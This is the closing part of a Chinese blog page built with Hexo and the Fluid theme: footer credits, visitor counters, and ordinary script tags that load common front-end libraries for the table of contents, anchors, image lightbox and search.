       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
